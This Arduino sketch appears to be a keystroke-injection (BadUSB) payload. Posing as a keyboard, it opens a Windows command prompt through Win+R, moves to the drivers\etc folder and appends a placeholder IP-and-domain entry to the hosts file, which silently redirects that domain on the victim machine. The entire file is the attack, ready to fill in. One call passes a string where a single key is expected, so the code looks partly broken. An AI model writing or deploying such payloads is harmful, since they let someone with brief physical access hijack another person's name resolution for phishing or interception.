#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(2000);
  typeKey(KEY_ESC);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press("r");
  Keyboard.releaseAll();

  delay(400);
  Keyboard.print(F("cmd"));

  delay(400);
  typeKey(KEY_RETURN);

  delay(400);
  Keyboard.print(F("cd C:\\Windows\\System32\\drivers\\etc\\"));

  typeKey(KEY_RETURN);

  delay(400);
  Keyboard.print(F("echo <ip> <domain>>>hosts"));

  delay(400);
  typeKey(KEY_RETURN);

  delay(400);
  Keyboard.print(F("exit"));

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
